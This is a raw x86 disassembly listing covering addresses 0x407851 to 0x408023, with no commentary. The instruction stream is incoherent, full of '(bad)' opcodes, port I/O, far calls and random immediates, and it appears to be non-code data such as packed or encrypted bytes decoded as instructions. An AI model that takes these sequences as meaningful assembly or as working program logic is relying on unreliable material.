  407851:	div    BYTE PTR [edx+ecx*8+0x47]
  407855:	xchg   esi,eax
  407856:	mov    eax,ds:0xc400cf74
  40785b:	add    dl,BYTE PTR [ebx+0xb]
  40785e:	adc    ah,BYTE PTR [edi-0x57db1431]
  407864:	mov    cl,0xbc
  407866:	xor    bh,BYTE PTR [ecx+0x30]
  407869:	test   eax,0x45a630f9
  40786e:	sub    DWORD PTR [eax],0x66d02fc7
  407874:	les    ebx,FWORD PTR [esi]
  407876:	test   eax,0xd608f4ba
  40787b:	ins    BYTE PTR es:[edi],dx
  40787c:	jne    0x407857
  40787e:	out    dx,al
  40787f:	aam    0xc1
  407881:	mov    edx,0x1a4d3feb
  407886:	adc    DWORD PTR [edx-0x5e0bbbb4],ecx
  40788c:	jp     0x407861
  40788e:	fdivr  QWORD PTR [esi-0x707a77d9]
  407894:	jne    0x4078cc
  407896:	inc    ecx
  407897:	mov    edx,0xb2db6701
  40789c:	or     al,0xb9
  40789e:	pop    ss
  40789f:	stos   DWORD PTR es:[edi],eax
  4078a0:	rcr    DWORD PTR [edi-0x4],0xd5
  4078a4:	outs   dx,BYTE PTR ds:[esi]
  4078a5:	pop    eax
  4078a6:	inc    ecx
  4078a7:	lock cmp esi,esi
  4078aa:	mov    dl,0xf2
  4078ac:	test   eax,0xb41b90b5
  4078b1:	xor    BYTE PTR [esi],ch
  4078b3:	mov    ds:0xfb1f993d,eax
  4078b8:	mov    eax,0xe598c400
  4078bd:	jnp    0x407842
  4078bf:	sub    BYTE PTR [ecx-0x37],bh
  4078c2:	or     ecx,DWORD PTR [edx]
  4078c4:	leave  
  4078c5:	sub    eax,0xf532c1dd
  4078ca:	pop    edx
  4078cb:	rol    DWORD PTR [edx+0x108ece2b],0x6c
  4078d2:	mov    edi,0x7c040c58
  4078d7:	ds inc edx
  4078d9:	gs sahf 
  4078db:	mov    ecx,0x3c9c61e2
  4078e0:	and    ah,BYTE PTR [edi]
  4078e2:	fwait
  4078e3:	cmp    esi,0x4e5136d7
  4078e9:	std    
  4078ea:	mov    WORD PTR [ebx+0x5720b6d9],gs
  4078f0:	mov    esi,0x43a0fb4c
  4078f5:	lea    edi,ds:0x6bac2df1
  4078fb:	fldenv ds:0x9773417f
  407901:	and    DWORD PTR ds:0x41a62e0a,edi
  407907:	leave  
  407908:	scas   al,BYTE PTR es:[edi]
  407909:	bound  eax,QWORD PTR [ecx]
  40790b:	adc    ebx,DWORD PTR [ebx]
  40790d:	mov    dh,0xe7
  40790f:	ss push cs
  407911:	nop
  407912:	lock out 0xe8,al
  407915:	mov    eax,ds:0xd18212c2
  40791a:	out    dx,eax
  40791b:	mov    eax,0xd189885a
  407920:	mov    ah,0xac
  407922:	das    
  407923:	call   0x5ed8:0x8b5dbd2b
  40792a:	mov    edx,0x108590a
  40792f:	and    esi,edx
  407931:	push   eax
  407932:	in     al,0x15
  407934:	pop    ebx
  407935:	mov    edx,0xf46356dc
  40793a:	ror    DWORD PTR [ecx],1
  40793c:	mov    eax,ds:0x8b2b5031
  407941:	(bad)  
  407942:	(bad)  
  407943:	adc    DWORD PTR [eax+0x17],eax
  407946:	ror    DWORD PTR [eax-0x74],cl
  407949:	add    al,0x4e
  40794b:	call   DWORD PTR [edi+0x15e1dc05]
  407951:	sub    esp,DWORD PTR [esi-0x7e]
  407954:	hlt    
  407955:	out    0x7c,eax
  407957:	adc    bl,BYTE PTR ds:0x47de9311
  40795d:	pop    eax
  40795e:	adc    DWORD PTR [ecx-0x31],ebx
  407961:	push   edx
  407962:	add    cl,0x76
  407965:	pop    ebp
  407966:	or     bl,BYTE PTR [esi+0x1d]
  407969:	out    0x3c,eax
  40796b:	shl    DWORD PTR [ebx],cl
  40796d:	stc    
  40796e:	rcl    edi,1
  407970:	mov    ds:0x56db7c1f,al
  407975:	lds    ebx,FWORD PTR [esi-0x30d3c8f1]
  40797b:	(bad)  
  40797c:	and    al,BYTE PTR [eax]
  40797e:	mov    WORD PTR [ecx-0x69],es
  407981:	inc    ebp
  407982:	fidivr WORD PTR [edi+0x4d]
  407985:	aad    0x99
  407987:	jle    0x407909
  407989:	sub    dl,BYTE PTR [eax+0x7]
  40798c:	adc    al,0xe3
  40798e:	inc    esi
  40798f:	push   0x24
  407991:	jae    0x40794e
  407993:	cdq    
  407994:	sahf   
  407995:	lock je 0x407949
  407998:	sub    esp,eax
  40799a:	adc    al,0x92
  40799c:	jmp    FWORD PTR [esi]
  40799e:	xchg   eax,edi
  4079a0:	mov    ebx,DWORD PTR [eax-0x57]
  4079a3:	je     0x407975
  4079a5:	in     eax,dx
  4079a6:	(bad)  
  4079a7:	jp     0x4079a6
  4079a9:	out    0x1,al
  4079ab:	sbb    dl,BYTE PTR [edx+0x59]
  4079ae:	jae    0x4079d7
  4079b0:	xchg   dh,bl
  4079b2:	(bad)  
  4079b3:	int    0xc2
  4079b5:	mov    edx,0xe253526d
  4079ba:	jb     0x407978
  4079bc:	mov    bl,0x6
  4079be:	(bad)  
  4079bf:	mov    ecx,0xb34d9954
  4079c4:	int3   
  4079c5:	mov    ecx,0x5b9a8121
  4079ca:	xchg   DWORD PTR gs:[ecx],ebp
  4079cd:	add    BYTE PTR [edx+ebp*8+0x32],al
  4079d1:	sbb    al,0xe4
  4079d3:	fist   WORD PTR [ebp+0x7d]
  4079d6:	cdq    
  4079d7:	out    0x65,eax
  4079d9:	rol    BYTE PTR [ecx],1
  4079db:	push   edi
  4079dc:	sbb    ebp,DWORD PTR [edx+0x50]
  4079df:	test   eax,0x8bf6a452
  4079e4:	xor    eax,0xa90ffc2a
  4079e9:	cld    
  4079ea:	ror    al,1
  4079ec:	(bad)  
  4079ed:	cmp    dl,BYTE PTR [ecx]
  4079ef:	repnz fst DWORD PTR ds:0x9a73168c
  4079f6:	mov    ds:0xcb99e081,eax
  4079fb:	inc    ebp
  4079fc:	push   cs
  4079fd:	xchg   eax,esi
  4079ff:	mov    eax,ds:0xe3eb2251
  407a04:	pop    ss
  407a05:	cmp    dh,BYTE PTR [eax-0x25b4689c]
  407a0b:	sbb    DWORD PTR [ebx],eax
  407a0d:	inc    esp
  407a0e:	jae    0x40799b
  407a10:	shl    DWORD PTR [ecx],cl
  407a12:	(bad)  
  407a14:	(bad)  
  407a15:	in     al,dx
  407a16:	out    dx,eax
  407a17:	inc    esp
  407a18:	call   0x3fa4:0x8312707c
  407a1f:	sbb    DWORD PTR [edx-0x2a],ebx
  407a22:	fst    QWORD PTR [edx]
  407a24:	stos   DWORD PTR es:[edi],eax
  407a25:	xor    BYTE PTR [edx],al
  407a27:	lahf   
  407a28:	mov    ch,0x15
  407a2a:	adc    DWORD PTR [eax+ecx*2-0x2c0f39a4],esi
  407a31:	jns    0x407a96
  407a33:	test   al,0x86
  407a35:	or     ecx,DWORD PTR [edx]
  407a37:	add    al,0xf0
  407a39:	and    DWORD PTR [edi+eax*4+0x6f],eax
  407a3d:	leave  
  407a3e:	outs   dx,DWORD PTR ds:[esi]
  407a3f:	stc    
  407a40:	push   ebx
  407a41:	dec    esp
  407a42:	mov    edx,gs
  407a44:	jge    0x407a3a
  407a46:	xor    edi,eax
  407a48:	xchg   ecx,eax
  407a49:	inc    edx
  407a4a:	pop    es
  407a4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a4c:	push   esp
  407a4d:	jge    0x407a12
  407a4f:	inc    esp
  407a50:	sub    DWORD PTR ds:0x5a5b5147,esi
  407a56:	pop    esp
  407a57:	icebp  
  407a58:	scas   al,BYTE PTR es:[edi]
  407a59:	mov    dl,0x22
  407a5b:	xchg   ecx,eax
  407a5c:	push   eax
  407a5d:	dec    ebp
  407a5e:	(bad)  
  407a5f:	arpl   WORD PTR [edi],cx
  407a61:	ins    BYTE PTR es:[edi],dx
  407a62:	or     al,0x55
  407a64:	ds fabs 
  407a67:	push   ebx
  407a68:	mov    al,BYTE PTR [ebp-0x7e]
  407a6b:	adc    ebx,DWORD PTR [eax+ebx*1+0x41]
  407a6f:	cmp    al,0x9d
  407a71:	and    DWORD PTR [ebx+0x58d03ddc],esp
  407a77:	lea    edx,[eax-0x4111b3b1]
  407a7d:	mov    ah,0xbf
  407a7f:	and    DWORD PTR ds:0x530f3bd8,0xcfdb6de5
  407a89:	xchg   edi,eax
  407a8b:	inc    eax
  407a8c:	xor    ecx,ebp
  407a8e:	dec    ecx
  407a8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a90:	xabort 0x9e
  407a93:	hlt    
  407a94:	ja     0x407aff
  407a96:	mov    edi,0x42ce1642
  407a9b:	and    DWORD PTR [eax+eax*4-0x5d8a6fc6],ebx
  407aa2:	or     dl,al
  407aa4:	and    BYTE PTR [ecx*2+0x17cc847e],ch
  407aab:	sahf   
  407aac:	xchg   ecx,eax
  407aad:	jp     0x407a52
  407aaf:	or     cl,ch
  407ab1:	mov    ch,0xa0
  407ab3:	stc    
  407ab4:	pop    ss
  407ab5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ab6:	add    eax,0x9cca19a8
  407abb:	(bad)  
  407abc:	xlat   BYTE PTR ds:[ebx]
  407abd:	cmp    eax,0xb3d116e6
  407ac2:	or     ch,bl
  407ac4:	aaa    
  407ac5:	mov    al,0xf7
  407ac7:	je     0x407b35
  407ac9:	mov    DWORD PTR [ecx],0x6a35bdd7
  407acf:	sbb    al,0x86
  407ad1:	mov    dl,0xc2
  407ad3:	xchg   edi,eax
  407ad4:	pop    edi
  407ad5:	setae  BYTE PTR [esi*2+0x711e4360]
  407add:	pop    esp
  407ade:	arpl   WORD PTR [esi],cx
  407ae0:	clc    
  407ae1:	cmc    
  407ae2:	push   eax
  407ae3:	out    dx,eax
  407ae4:	test   cl,bh
  407ae6:	stc    
  407ae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ae8:	xor    DWORD PTR [esi],eax
  407aea:	shr    DWORD PTR [edi-0x77345e27],cl
  407af0:	pop    ebp
  407af1:	inc    ebp
  407af2:	jmp    0x407b63
  407af4:	xchg   ebp,eax
  407af5:	pop    esp
  407af6:	arpl   sp,cx
  407af8:	mov    ds,WORD PTR [ebx+eiz*1+0x2e]
  407afc:	in     al,0x17
  407afe:	inc    ebp
  407aff:	loope  0x407b31
  407b01:	pushf  
  407b02:	jecxz  0x407a8c
  407b04:	int    0x7
  407b06:	cmp    cl,BYTE PTR [eax-0x3]
  407b09:	jg     0x407b58
  407b0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b0c:	add    esp,ebx
  407b0e:	xchg   edx,eax
  407b0f:	les    esp,FWORD PTR [ebx]
  407b11:	xchg   BYTE PTR [esi],ch
  407b13:	jl     0x407aa6
  407b15:	(bad)  
  407b16:	daa    
  407b17:	mov    ebp,eax
  407b19:	je     0x407b2a
  407b1b:	fs push esi
  407b1d:	mov    ebx,0x1fb2f492
  407b22:	ds pop esi
  407b24:	xlat   BYTE PTR ds:[ebx]
  407b25:	mov    ds:0xabf42b94,eax
  407b2a:	push   esi
  407b2b:	icebp  
  407b2c:	ret    0x3f68
  407b2f:	mov    ch,0x54
  407b31:	in     eax,dx
  407b32:	call   0x97f8:0xba1657ca
  407b39:	push   ds
  407b3a:	jnp    0x407ac1
  407b3c:	jle    0x407b48
  407b3e:	in     eax,0x46
  407b40:	(bad)  
  407b41:	dec    esp
  407b42:	arpl   WORD PTR [edi+0x66],bx
  407b45:	rol    edx,1
  407b47:	mov    esp,0x7cc2f7a1
  407b4c:	pop    ds
  407b4d:	adc    DWORD PTR [ebx+ebx*1-0x7675f734],ebx
  407b54:	inc    esp
  407b55:	pop    ebp
  407b56:	and    eax,0x560ffd4b
  407b5b:	repz lahf 
  407b5d:	sub    BYTE PTR [edi+0x6e],ah
  407b60:	or     BYTE PTR [ebx+0x55],0xe3
  407b64:	in     al,dx
  407b65:	not    DWORD PTR [esi-0x63]
  407b68:	mov    esp,0x11fb5630
  407b6d:	es ins BYTE PTR es:[edi],dx
  407b6f:	adc    al,0xd9
  407b71:	dec    ecx
  407b72:	rcr    BYTE PTR [edx-0x7da57441],0x8b
  407b79:	pop    ds
  407b7a:	(bad)  
  407b7c:	adc    al,0xe1
  407b7e:	mov    ch,0xc3
  407b80:	push   0x5f
  407b82:	shl    DWORD PTR [edx+0x42625572],cl
  407b88:	cwde   
  407b89:	gs add esp,DWORD PTR fs:0xa82b12d0
  407b91:	loope  0x407be6
  407b93:	xor    esi,DWORD PTR [edx-0x3d]
  407b96:	or     BYTE PTR [eax-0x3b],ah
  407b99:	push   ebx
  407b9a:	retf   0xf6e1
  407b9d:	or     eax,0xe7cf490
  407ba2:	(bad)  
  407ba3:	xor    al,0x28
  407ba5:	inc    ecx
  407ba6:	dec    ecx
  407ba7:	jne    0x407bde
  407ba9:	and    esp,DWORD PTR cs:[ebx-0x7095eef5]
  407bb0:	aas    
  407bb1:	fmul   st,st(7)
  407bb3:	js     0x407b8f
  407bb5:	idiv   dh
  407bb7:	data16 out dx,al
  407bb9:	pop    ss
  407bba:	das    
  407bbb:	shl    DWORD PTR [esi+ebp*8+0x72],cl
  407bbf:	dec    edx
  407bc0:	xchg   DWORD PTR [edi],esp
  407bc2:	sahf   
  407bc3:	adc    BYTE PTR [ecx-0x2df174a0],dh
  407bc9:	or     dl,BYTE PTR [ebp+ebp*4+0x601097ce]
  407bd0:	xlat   BYTE PTR ds:[ebx]
  407bd1:	jne    0x407ba3
  407bd3:	out    0x42,eax
  407bd5:	in     al,0x4d
  407bd7:	sbb    eax,0xaf258abb
  407bdc:	pop    edx
  407bdd:	outs   dx,BYTE PTR ds:[esi]
  407bde:	jne    0x407c3b
  407be0:	rcr    BYTE PTR [esi],0xaf
  407be3:	jbe    0x407ba5
  407be5:	js     0x407c64
  407be7:	test   BYTE PTR [edi+ecx*1-0x1f9f52d5],ch
  407bee:	xor    eax,0x58cf7b9a
  407bf3:	sbb    esi,DWORD PTR [ebp+0x6727031a]
  407bf9:	xor    BYTE PTR es:[esi+edi*8+0x2f456505],dl
  407c01:	xor    eax,0xc8add16
  407c06:	push   esp
  407c07:	fs retf 0x3a3d
  407c0b:	in     eax,dx
  407c0c:	sbb    BYTE PTR [eax+0x16],cl
  407c0f:	pop    ds
  407c10:	(bad)  
  407c12:	and    BYTE PTR [eax],bh
  407c14:	nop
  407c15:	enter  0x9dca,0x47
  407c19:	pop    ebp
  407c1a:	jnp    0x407baa
  407c1c:	pop    edi
  407c1d:	in     eax,dx
  407c1e:	daa    
  407c1f:	sbb    ecx,DWORD PTR [edi]
  407c21:	and    cl,ch
  407c23:	sub    eax,0x374ecc37
  407c28:	sar    BYTE PTR [ebx],cl
  407c2a:	jp     0x407ca8
  407c2c:	push   edx
  407c2d:	imul   ecx,edi,0x47
  407c30:	sbb    DWORD PTR [edi-0x766a56f0],0x310db763
  407c3a:	mov    ebp,0x84be88ff
  407c3f:	imul   ecx,eax,0xffffff8b
  407c42:	lods   eax,DWORD PTR ds:[esi]
  407c43:	sub    DWORD PTR [esi],ecx
  407c45:	adc    BYTE PTR [ebp+0x69045db5],al
  407c4b:	jge    0x407c83
  407c4d:	push   ds
  407c4e:	jmp    DWORD PTR ds:0xf47e224
  407c54:	cmp    cl,BYTE PTR [edx+edx*2]
  407c57:	nop
  407c58:	jmp    0x54c6:0x202efb03
  407c5f:	adc    ebp,DWORD PTR [edi]
  407c61:	xlat   BYTE PTR ds:[ebx]
  407c62:	push   esp
  407c63:	mov    ds:0x3a3d7612,eax
  407c68:	fcom   DWORD PTR [eax-0x49]
  407c6b:	mov    eax,DWORD PTR [ebp-0x1d5c3e70]
  407c71:	retf   
  407c72:	mov    dl,ah
  407c74:	pushf  
  407c75:	or     al,0x97
  407c77:	nop
  407c78:	(bad)  
  407c79:	cmc    
  407c7a:	aas    
  407c7b:	out    0x7d,al
  407c7d:	(bad)  
  407c7e:	jle    0x407ceb
  407c80:	js     0x407c6b
  407c82:	jmp    0x1de1:0x65242c27
  407c89:	mov    ebx,0x3d98ba6b
  407c8e:	stos   BYTE PTR es:[edi],al
  407c8f:	out    0x81,eax
  407c91:	stos   DWORD PTR es:[edi],eax
  407c92:	and    esp,esi
  407c94:	ds loopne 0x407c9a
  407c97:	jp     0x407cc3
  407c99:	jnp    0x407cb7
  407c9b:	mov    ch,0xa7
  407c9d:	lods   eax,DWORD PTR ds:[esi]
  407c9e:	cmc    
  407c9f:	cmp    DWORD PTR [eax-0x19],0xffffffa1
  407ca3:	mov    esi,eax
  407ca5:	hlt    
  407ca6:	push   ecx
  407ca7:	out    0x1d,al
  407ca9:	xchg   ebp,eax
  407caa:	push   edx
  407cab:	dec    ebx
  407cac:	sbb    ch,BYTE PTR [edi]
  407cae:	pushf  
  407caf:	mov    dl,0x75
  407cb1:	sub    eax,0xe8dc37f8
  407cb6:	(bad)
  407cb9:	fwait
  407cba:	ins    DWORD PTR es:[edi],dx
  407cbb:	ins    BYTE PTR es:[edi],dx
  407cbc:	pop    edi
  407cbd:	mov    ah,0x3a
  407cbf:	mov    eax,ds:0x61df2593
  407cc4:	loop   0x407c6d
  407cc6:	cmp    DWORD PTR [ecx-0x4a78708b],edx
  407ccc:	cmp    edi,esi
  407cce:	sti    
  407ccf:	and    al,0x36
  407cd1:	retfw  0x6029
  407cd5:	jg     0x407c61
  407cd7:	mov    ecx,0xc7049a28
  407cdc:	pusha  
  407cdd:	push   0x6f
  407cdf:	jp     0x407c89
  407ce1:	push   es
  407ce2:	jb     0x407c7a
  407ce4:	push   edx
  407ce5:	mov    al,ds:0xbd359e00
  407cea:	adc    BYTE PTR [edi],al
  407cec:	fisub  WORD PTR [edi-0x7ff955fd]
  407cf2:	add    bh,ch
  407cf4:	dec    esp
  407cf5:	and    eax,DWORD PTR [ebp-0x62]
  407cf8:	jns    0x407d3f
  407cfa:	mov    bl,0x35
  407cfc:	gs cdq 
  407cfe:	inc    edi
  407cff:	sub    bh,ah
  407d01:	inc    esi
  407d02:	and    DWORD PTR [edx],0x74
  407d05:	jno    0x407d60
  407d07:	test   al,0xfc
  407d09:	dec    ebp
  407d0a:	hlt    
  407d0b:	retf   
  407d0c:	sub    al,0x43
  407d0e:	fisttp WORD PTR [ecx-0x68]
  407d11:	jge    0x407d92
  407d13:	push   esi
  407d14:	pop    esp
  407d15:	mov    WORD PTR [esi-0x45c9e4d2],?
  407d1b:	popa   
  407d1c:	and    BYTE PTR [ecx-0x19bf4705],cl
  407d22:	cmp    al,0x82
  407d24:	lock aas 
  407d26:	sub    eax,DWORD PTR [edi-0x40f8f3d]
  407d2c:	call   0x46ac:0xae2bfc5
  407d33:	xchg   esp,eax
  407d34:	mov    ds:0x49dcfc2,eax
  407d39:	(bad)  
  407d3a:	xchg   ecx,eax
  407d3b:	push   es
  407d3c:	sbb    BYTE PTR [esi+edi*8+0x13],0xa4
  407d41:	mov    bl,0x29
  407d43:	pusha  
  407d44:	sub    eax,0x9c466c44
  407d49:	mov    ds,WORD PTR [eax+0x54]
  407d4c:	mov    eax,0x72caced0
  407d51:	cdq    
  407d52:	sti    
  407d53:	mov    edi,cs
  407d55:	jl     0x407daa
  407d57:	ror    DWORD PTR [eax],0x5c
  407d5a:	dec    eax
  407d5b:	test   BYTE PTR [eax-0x20],0x56
  407d5f:	adc    BYTE PTR [edi+0x22ec70f9],0x64
  407d66:	push   0xde7d412a
  407d6b:	xchg   ah,bh
  407d6d:	jbe    0x407db8
  407d6f:	ja     0x407d0f
  407d71:	jmp    0xa6a4:0x9342d14a
  407d78:	loopne 0x407d84
  407d7a:	retf   
  407d7b:	sub    DWORD PTR [ecx+0x7c],0xffffff84
  407d7f:	scas   al,BYTE PTR es:[edi]
  407d80:	push   ebx
  407d81:	add    dl,bl
  407d83:	mov    ah,0xef
  407d85:	(bad)
  407d88:	or     DWORD PTR [edi+0x6],esi
  407d8b:	jo     0x407d16
  407d8d:	pop    ebp
  407d8e:	inc    ecx
  407d8f:	mov    ah,0x99
  407d91:	ja     0x407da7
  407d93:	cli    
  407d94:	inc    edx
  407d95:	mov    ecx,0xb00c85e5
  407d9a:	xor    eax,0x8ef80dd3
  407d9f:	pop    edi
  407da0:	mov    ecx,0xd5b56094
  407da5:	lock outs dx,DWORD PTR ds:[esi]
  407da7:	jnp    0x407db2
  407da9:	(bad)  
  407daa:	fdivr  DWORD PTR [ebx-0x80]
  407dad:	push   eax
  407dae:	inc    ebp
  407daf:	retf   0x53ff
  407db2:	xor    al,0x7f
  407db4:	lahf   
  407db5:	addr16 inc edi
  407db7:	mov    esp,0xa0862c1b
  407dbc:	adc    dh,dl
  407dbe:	cmp    DWORD PTR [ecx-0x44e70e31],ecx
  407dc4:	dec    esp
  407dc5:	mov    edx,0x420f3361
  407dca:	push   ss
  407dcb:	add    ebp,esi
  407dcd:	out    0x50,eax
  407dcf:	sahf   
  407dd0:	pop    esi
  407dd1:	das    
  407dd2:	push   ds
  407dd3:	lods   al,BYTE PTR ds:[esi]
  407dd4:	add    al,0xf8
  407dd6:	cvtps2pi mm3,QWORD PTR [ebp+0xb6ed04b]
  407ddd:	sub    bh,BYTE PTR [ecx+0x4f]
  407de0:	mov    DWORD PTR [eax-0xe07b877],ebx
  407de6:	lods   al,BYTE PTR ds:[esi]
  407de7:	add    al,BYTE PTR [edi-0x60c805d9]
  407ded:	xchg   ebx,eax
  407dee:	push   edx
  407def:	outs   dx,BYTE PTR ds:[esi]
  407df0:	add    eax,0xd2fc73e0
  407df5:	mov    cl,0xa7
  407df7:	or     BYTE PTR [eax-0x75fc518d],cl
  407dfd:	(bad)  
  407dfe:	arpl   WORD PTR [ebx],bx
  407e00:	push   ds
  407e01:	push   ecx
  407e02:	in     al,0x84
  407e04:	idiv   BYTE PTR [edi-0x1e8ae3fa]
  407e0a:	xchg   esi,eax
  407e0b:	mov    ds:0xd9104aef,al
  407e10:	ret    0x428a
  407e13:	sar    al,1
  407e15:	dec    ecx
  407e16:	jp     0x407e7c
  407e18:	sbb    al,BYTE PTR [edx-0x6a19aa2d]
  407e1e:	or     DWORD PTR [esi+0x57],0x77
  407e22:	fwait
  407e23:	ret    
  407e24:	xchg   BYTE PTR ds:0x584a88f0,ch
  407e2a:	jg     0x407e2a
  407e2c:	mov    WORD PTR es:[ecx-0x31100aa9],ss
  407e33:	rol    bl,1
  407e35:	mov    esi,DWORD PTR [ecx]
  407e37:	mov    dh,0xb
  407e39:	fstp   QWORD PTR [eax]
  407e3b:	sbb    DWORD PTR [eax+0x4a],ebp
  407e3e:	mov    DWORD PTR [ebx-0x37],eax
  407e41:	sbb    al,dl
  407e43:	retf   
  407e44:	cmp    eax,0x208d5f85
  407e49:	imul   BYTE PTR [esi+0x36]
  407e4c:	mov    edi,edi
  407e4e:	cli    
  407e4f:	and    DWORD PTR [esi-0x5b],edx
  407e52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e53:	aas    
  407e54:	rcr    ecx,cl
  407e56:	push   edx
  407e57:	cmp    eax,0xf9d03a9a
  407e5c:	in     eax,dx
  407e5d:	cmp    eax,0x560b46a5
  407e62:	jmp    0x4ce1b3be
  407e67:	xor    ebx,DWORD PTR [eax-0x4b5a6f0c]
  407e6d:	and    ch,bh
  407e6f:	jmp    0xb7db66ab
  407e74:	mov    edi,0xde481c66
  407e79:	sbb    ah,BYTE PTR [ebp+eiz*4-0x15]
  407e7d:	push   edi
  407e7e:	out    dx,al
  407e7f:	es cld 
  407e81:	inc    edi
  407e82:	nop
  407e83:	sbb    BYTE PTR [eax-0x24],al
  407e86:	mov    ch,0x60
  407e88:	js     0x407eab
  407e8a:	jb     0x407e8d
  407e8c:	jp     0x407ecb
  407e8e:	scas   al,BYTE PTR es:[edi]
  407e8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e90:	js     0x407e83
  407e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e93:	div    DWORD PTR [esi-0x2f]
  407e96:	pop    esp
  407e97:	imul   esi,DWORD PTR [edx+0x48fac544],0x2e
  407e9e:	cli    
  407e9f:	call   0x1ab6:0x1cffa2a0
  407ea6:	or     esp,DWORD PTR [ebp+0x887f9e9]
  407eac:	pop    edx
  407ead:	xor    BYTE PTR ds:0x91b767be,cl
  407eb3:	inc    esi
  407eb4:	sub    ebx,esp
  407eb6:	dec    ebx
  407eb7:	retf   
  407eb8:	mov    esp,0xde309209
  407ebd:	jno    0x407f3c
  407ebf:	pop    ecx
  407ec0:	xor    eax,ebp
  407ec2:	cmp    al,0x58
  407ec4:	and    bl,cl
  407ec6:	xchg   edx,eax
  407ec7:	jle    0x407ee4
  407ec9:	cmp    bl,dh
  407ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ecc:	push   eax
  407ecd:	jmp    0x8ae:0x34aa6017
  407ed4:	ins    DWORD PTR es:[edi],dx
  407ed5:	pop    ebp
  407ed6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ed7:	jmp    0x407f28
  407ed9:	dec    ebx
  407eda:	cmp    BYTE PTR [eax+0x2f],ch
  407edd:	xchg   ecx,eax
  407ede:	mov    eax,ds:0x19bbf76f
  407ee3:	xchg   DWORD PTR [edi+eiz*8],esp
  407ee6:	ror    DWORD PTR [esi-0xe],0xda
  407eea:	mov    ebx,0x7ebcaff5
  407eef:	shr    BYTE PTR [esi],0xb0
  407ef2:	neg    BYTE PTR [esp+ebp*4-0xb6648bf]
  407ef9:	dec    ebp
  407efa:	dec    esp
  407efb:	jns    0x407f50
  407efd:	fsubr  QWORD PTR [ebp-0x741636]
  407f03:	(bad)  
  407f04:	push   ss
  407f05:	scas   eax,DWORD PTR es:[edi]
  407f06:	fld    DWORD PTR [ecx+0x2a79a877]
  407f0c:	stc    
  407f0d:	in     eax,0x82
  407f0f:	jo     0x407f3b
  407f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f12:	daa    
  407f13:	cmp    ebx,edx
  407f15:	call   0xa5fe:0xdf14d1d
  407f1c:	mov    dh,0xd2
  407f1e:	pop    ds
  407f1f:	loopne 0x407ef8
  407f21:	add    eax,0xfc55536e
  407f26:	pop    ecx
  407f27:	cdq    
  407f28:	xchg   DWORD PTR [ebp-0x2b1ec4e1],edx
  407f2e:	out    dx,eax
  407f2f:	fst    DWORD PTR [edx+edx*8-0x67]
  407f33:	or     cl,BYTE PTR [eax+0xd]
  407f36:	pop    ecx
  407f37:	xor    ebx,edx
  407f39:	or     al,0x99
  407f3b:	enter  0x1ee9,0xbe
  407f3f:	gs test al,0x21
  407f42:	int3   
  407f43:	dec    ecx
  407f44:	fyl2xp1 
  407f46:	(bad)  [eax+0x309b8ff1]
  407f4c:	dec    esp
  407f4d:	(bad)  
  407f4e:	(bad)  
  407f4f:	xor    al,BYTE PTR [bx+di-0x32b3]
  407f54:	add    BYTE PTR [ebp-0x61],cl
  407f57:	xor    ecx,DWORD PTR [edx]
  407f59:	push   0xe90fbc58
  407f5e:	push   es
  407f5f:	mov    ch,0x84
  407f61:	fimul  WORD PTR [ebx+edx*4]
  407f64:	pop    ds
  407f65:	adc    BYTE PTR [eax+0x4f],al
  407f68:	(bad)  
  407f69:	sbb    eax,0x933f87f
  407f6e:	(bad)  
  407f70:	jae    0x407f24
  407f72:	jbe    0x407f6e
  407f74:	push   es
  407f75:	or     BYTE PTR [eax+0x3a54da68],0xf4
  407f7c:	xchg   edx,eax
  407f7d:	pop    ecx
  407f7e:	je     0x407f73
  407f80:	or     ecx,0xffffff83
  407f83:	jmp    0x6930bb7b
  407f88:	and    ch,BYTE PTR [ecx+0x6f931c59]
  407f8e:	aaa    
  407f8f:	in     eax,0x33
  407f91:	out    0x6,al
  407f93:	sub    ecx,ebx
  407f95:	mov    ds:0x286ace98,al
  407f9a:	aas    
  407f9b:	pop    ss
  407f9c:	cvtdq2ps xmm6,XMMWORD PTR [ebx-0x44]
  407fa0:	stos   DWORD PTR es:[edi],eax
  407fa1:	enter  0x78f7,0x55
  407fa5:	pop    ecx
  407fa6:	(bad)  
  407fa7:	adc    DWORD PTR [edx+0xa],esp
  407faa:	push   0x19ee5d03
  407faf:	jmp    0x407f93
  407fb1:	inc    edi
  407fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fb3:	mov    cs,WORD PTR [edi-0x73ca9676]
  407fb9:	push   ebx
  407fba:	daa    
  407fbb:	and    ch,BYTE PTR [ebp+ebp*4+0x6ac2966]
  407fc2:	stc    
  407fc3:	shr    edi,0xaa
  407fc6:	fnstcw WORD PTR ds:0xf2d7a894
  407fcc:	jl     0x407ff9
  407fce:	jne    0x407ff1
  407fd0:	fmul   DWORD PTR [edi+eiz*1]
  407fd3:	jae    0x407f66
  407fd5:	test   eax,0xcdd5c2ac
  407fda:	es inc edi
  407fdc:	push   ss
  407fdd:	inc    eax
  407fde:	rol    DWORD PTR [ecx-0x53],0x11
  407fe2:	mov    cl,0x15
  407fe4:	push   esp
  407fe5:	jns    0x407fa1
  407fe7:	fnstsw WORD PTR [ebx-0x70]
  407fea:	mov    WORD PTR [edx+eiz*4+0x5c61a2ca],?
  407ff1:	and    DWORD PTR ds:0xf6adbc1,ecx
  407ff7:	adc    dl,BYTE PTR [edx]
  407ff9:	in     al,0x50
  407ffb:	test   eax,0x7b8fbfa7
  408000:	sbb    esi,DWORD PTR [ebx-0x5b]
  408003:	cdq    
  408004:	arpl   WORD PTR [ebx+eax*4+0x13eb3168],di
  40800b:	lahf   
  40800c:	add    eax,0xcc056fea
  408011:	in     eax,0x4b
  408013:	pop    es
  408014:	mov    al,0x19
  408016:	sbb    eax,DWORD PTR ds:0xd6ed2c65
  40801c:	xchg   ecx,eax
  40801d:	gs push 0x3b49d02d
  408023:	fsub   st(7),st
